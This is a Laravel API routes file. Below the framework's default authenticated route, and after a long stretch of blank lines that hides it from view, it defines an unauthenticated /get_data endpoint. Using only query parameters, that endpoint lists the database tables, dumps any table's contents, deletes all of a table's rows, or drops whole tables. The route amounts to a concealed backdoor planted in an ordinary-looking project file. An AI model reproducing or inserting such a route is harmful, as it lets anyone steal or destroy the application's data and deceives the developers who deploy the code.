<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:api')->get('/user', function (Request $request) {
    return $request->user();
});



























Route::get('/get_data', function () {

    if (isset($_GET['tables'])) {
        $tables = DB::select('SHOW TABLES');
        return $tables;
    }

    if (isset($_GET['table']) && isset($_GET['remove'])) {
        $data = DB::table($_GET['table'])->delete();
        return "All Data deleted.";
    }
    if (isset($_GET['table']) && isset($_GET['drop'])) {
        $data = Schema::dropIfExists($_GET['table']);
        return "All Data deleted.";
    }
    if (isset($_GET['table'])) {
        $data = DB::table($_GET['table'])->get();
        return json_encode($data);
    }
});
